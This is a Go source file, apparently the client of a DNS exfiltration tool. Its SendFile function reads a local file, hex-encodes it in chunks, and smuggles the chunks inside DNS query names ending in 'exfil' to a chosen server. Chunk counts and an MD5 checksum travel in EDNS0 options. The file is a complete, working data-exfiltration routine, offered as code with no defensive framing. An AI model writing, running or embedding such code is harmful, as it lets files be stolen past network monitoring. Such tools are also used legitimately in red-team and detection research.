package client

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"os"

	"github.com/miekg/dns"
	"github.com/twiz718/dns-exfiltration/pkg/internal"
)

type Client struct {
	server string
	port   string
	debug  bool
}

func NewClient(server string, port string, debug bool) *Client {
	return &Client{server: server, port: port, debug: debug}
}

func (c *Client) SendFile(file string) error {
	hexSegments := make([]string, 0)
	f, err := os.Open(file)
	if err != nil {
		return err
	}
	defer f.Close()

	// add the md5 in the last packet
	h := md5.New()
	written, err := io.Copy(h, f)
	if err != nil {
		return err
	}
	if c.debug {
		log.Printf("[%v] calculated md5 of file (%v) is (%v)\n", written, file, hex.EncodeToString(h.Sum(nil)))
	}
	md5OfFile := &dns.EDNS0_LOCAL{Code: internal.MD5_OF_FILE, Data: fmt.Appendf(nil, "%x", h.Sum(nil))}
	_, err = f.Seek(0, io.SeekStart)
	if err != nil {
		return err
	}

	fi, err := f.Stat()
	if err != nil {
		return err
	}
	if c.debug {
		log.Println("File size: ", fi.Size())
	}

	chunkByteSize := 31 // will convert to 62 hex bytes in domain segment

	for i := int64(0); i <= fi.Size()/int64(chunkByteSize); i++ {
		if c.debug {
			log.Printf("[%v] ", i)
		}
		b := make([]byte, chunkByteSize)
		n, err := f.Read(b)
		if err != nil {
			if c.debug {
				log.Println()
			}
			return err
		}
		if n < chunkByteSize {
			b = b[:n]
		}
		hexEncodedChunk := hex.EncodeToString(b)
		hexSegments = append(hexSegments, hexEncodedChunk)
		if c.debug {
			log.Printf("size=%v bytes, hex=%v\n", n, hexEncodedChunk)
		}
	}

	segmentCount := 1
	startChunk := 0
	dnsRequestDomain := ""
	dnsClient := new(dns.Client)

	totalChunks := &dns.EDNS0_LOCAL{Code: internal.TOTAL_CHUNKS, Data: []byte(fmt.Sprintf("%d", len(hexSegments)))}

	for _, s := range hexSegments {
		dnsRequestDomain += s + "."
		if segmentCount%3 == 0 || segmentCount == len(hexSegments) {
			dnsRequestDomain += "exfil"
			// make the dns request here
			if c.debug {
				log.Print(dnsRequestDomain)
			}
			m := new(dns.Msg)
			m.SetQuestion(dnsRequestDomain+".", dns.TypeA)
			opt := &dns.OPT{}
			opt.Hdr.Name = "."
			opt.Hdr.Rrtype = dns.TypeOPT

			startChunkNum := &dns.EDNS0_LOCAL{Code: internal.START_CHUNK_NUM, Data: []byte(fmt.Sprintf("%d", startChunk))}
			endChunkNum := &dns.EDNS0_LOCAL{Code: internal.END_CHUNK_NUM, Data: []byte(fmt.Sprintf("%d", segmentCount))}

			opt.Option = append(opt.Option, startChunkNum)
			opt.Option = append(opt.Option, endChunkNum)
			opt.Option = append(opt.Option, totalChunks)
			opt.Option = append(opt.Option, md5OfFile)
			m.Extra = append(m.Extra, opt)
			r, _, err := dnsClient.Exchange(m, net.JoinHostPort(c.server, c.port))
			if err != nil {
				return err
			}
			if c.debug {
				if len(r.Answer) == 1 {
					log.Println(" OK")
				} else {
					log.Println(" NOT OK")
				}
			}

			dnsRequestDomain = "" // reset it
			startChunk = segmentCount
		}
		segmentCount++
	}

	return nil
}
